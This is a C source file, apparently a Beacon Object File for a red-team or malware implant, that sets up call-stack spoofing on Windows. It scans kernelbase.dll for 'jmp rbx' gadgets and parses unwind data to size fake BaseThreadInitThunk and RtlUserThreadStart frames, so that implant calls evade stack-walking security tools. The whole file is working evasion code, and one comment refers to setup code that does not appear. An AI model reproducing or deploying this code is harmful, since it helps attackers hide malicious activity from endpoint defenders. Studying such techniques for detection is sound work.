#include <windows.h>
#include "tcg.h"
#include "dfr.h"
#include "spoof.h"

SPOOF_CTX g_ctx;

/* ── parse_unwind_alloc ────────────────────────────────────────────────
 * Uses RtlLookupFunctionEntry to get the RUNTIME_FUNCTION for func_addr
 * and walks UNWIND_INFO to compute total RSP bytes allocated.
 * Returns 0 on failure or frame-pointer functions.                    */
static u32 parse_unwind_alloc(u8 *base, u64 func_addr)
{
    DWORD64 image_base = 0;
    PRUNTIME_FUNCTION rf = KERNEL32$RtlLookupFunctionEntry(
        func_addr, &image_base, NULL);
    if (!rf) return 0;

    u32  unwind_rva = ((u32 *)rf)[2] & ~1U;
    u8  *ui         = (u8 *)(image_base + unwind_rva);

    u8 frame_reg = ui[3] & 0x0F;
    if (frame_reg != 0) return 0;

    u8   code_count = ui[2];
    u16 *codes      = (u16 *)(ui + 4);
    u32  alloc      = 0;
    int  i;

    for (i = 0; i < (int)code_count; i++) {
        u8 op   = (codes[i] >> 8) & 0x0F;
        u8 info = (codes[i] >> 12) & 0x0F;
        if      (op == 0) { alloc += 8; }
        else if (op == 2) { alloc += (u32)(info + 1) * 8; }
        else if (op == 1) {
            if (info == 0) { i++; alloc += (u32)codes[i] * 8; }
            else           { i++; alloc += *(u32 *)(&codes[i]); i++; }
        }
    }
    return alloc;
}

/* Flow:
 *   1. Scan kernelbase for best FF E3 / FF 23 gadget (alloc >= 0x58)
 *   2. Compute BTIT/RUTS frame sizes dynamically
 *   3. Populate g_ctx — frames built on go()'s real stack, no allocation */
void init_spoof(void)
{
    u8 *base = (u8 *)KERNEL32$GetModuleHandleA("kernelbase.dll");
    dprintf("[+] init_spoof: base=0x%llx\n", (u64)base);
    if (!base) {
        dprintf("[-] init_spoof: kernelbase not found\n");
        return;
    }

    /* ── gadget scan ─────────────────────────────────────────────────── */
    u32  e_lfanew   = *(u32 *)(base + 0x3C);
    u8  *nt         = base + e_lfanew;
    u16  n_sections = *(u16 *)(nt + 0x06);
    u16  opt_size   = *(u16 *)(nt + 0x14);
    u8  *sections   = nt + 0x18 + opt_size;

    u64 best_gadget   = 0;
    u32 best_f_gadget = 0xFFFFFFFF;
    int s;

    for (s = 0; s < (int)n_sections; s++) {
        u8  *sec   = sections + s * 40;
        u32  chars = *(u32 *)(sec + 36);
        if (!((chars & 0x20) && (chars & 0x20000000))) continue;

        u32  vaddr = *(u32 *)(sec + 12);
        u32  vsize = *(u32 *)(sec + 8);
        u8  *ptr   = base + vaddr;
        u32  j;

        for (j = 0; j + 1 < vsize; j++) {
            if (ptr[j] != 0xFF) continue;
            if (ptr[j+1] != 0xE3 && ptr[j+1] != 0x23) continue;

            u64 cand  = (u64)(ptr + j);
            u32 alloc = parse_unwind_alloc(base, cand);

            if (alloc < 0x58 || alloc > 0x500) continue;

            dprintf("[+] init_spoof: candidate 0x%llx bytes %02x %02x alloc=0x%x\n",
                    cand, ptr[j], ptr[j+1], alloc);

            if (alloc < best_f_gadget) {
                best_gadget   = cand;
                best_f_gadget = alloc;
            }
        }
    }

    if (!best_gadget) {
        dprintf("[-] init_spoof: no gadget found in kernelbase\n");
        return;
    }

    /* ── BTIT / RUTS frame sizes ────────────────────────────────────── */
    u64 btit_addr = (u64)KERNEL32$BaseThreadInitThunk + 0x14;
    u64 ruts_addr = (u64)NTDLL$RtlUserThreadStart    + 0x21;

    u32 btit_sz = parse_unwind_alloc((u8*)KERNEL32$GetModuleHandleA("kernel32.dll"), btit_addr);
    u32 ruts_sz = parse_unwind_alloc((u8*)KERNEL32$GetModuleHandleA("ntdll.dll"),    ruts_addr);
    if (btit_sz == 0) btit_sz = 0x20;
    if (ruts_sz == 0) ruts_sz = 0x38;

    dprintf("[+] init_spoof: btit_sz=0x%x ruts_sz=0x%x\n", btit_sz, ruts_sz);

    u64 btit_off = 8 + (u64)best_f_gadget;
    u64 ruts_off = btit_off + 8 + btit_sz;
    u64 null_off = ruts_off + 8 + ruts_sz;
    u64 alloc_sz = null_off + 8;

    /* ── populate g_ctx ─────────────────────────────────────────────── */
    g_ctx.alloc_size = alloc_sz;
    g_ctx.gadget     = best_gadget;
    g_ctx.btit       = btit_addr;
    g_ctx.ruts       = ruts_addr;
    g_ctx.btit_off   = btit_off;
    g_ctx.ruts_off   = ruts_off;
    g_ctx.null_off   = null_off;
    g_ctx.real_ret   = 0;
    /* fake_stack already set above */
    g_ctx.fixup      = 0;
    g_ctx.real_rsp   = 0;

    dprintf("[+] init_spoof: gadget=0x%llx alloc=0x%llx btit@+0x%llx ruts@+0x%llx null@+0x%llx\n",
            best_gadget, alloc_sz, btit_off, ruts_off, null_off);
}